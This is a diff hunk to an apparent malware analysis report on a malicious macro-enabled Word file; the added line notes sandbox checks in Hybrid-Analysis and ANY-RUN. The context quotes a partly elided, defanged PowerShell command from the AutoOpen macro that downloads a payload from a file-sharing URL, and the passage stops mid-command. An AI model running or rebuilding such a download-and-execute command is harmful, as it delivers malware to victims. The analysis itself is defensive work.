@@ -67,6 +67,8 @@ The file **INVOICE PACKAGE LINK TO DOWNLOAD.docm** was identified as malicious b
   <em>Figure 2: VirusTotal Screenshot</em>
 </p>
 
+Additionally, this file has also been checked in the **Hybrid-Analysis** and **ANY-RUN** environments.
+
 When the document is opened, the AutoOpen macro is launched, which executes a **PowerShell** command. The script calls the command:
 
 *pwsh[.]exe -Command "EX ( ... ).Invoke('hxxps[:]//filetransfer[.]io[/]data-package[/]UR2whuBw[/]download
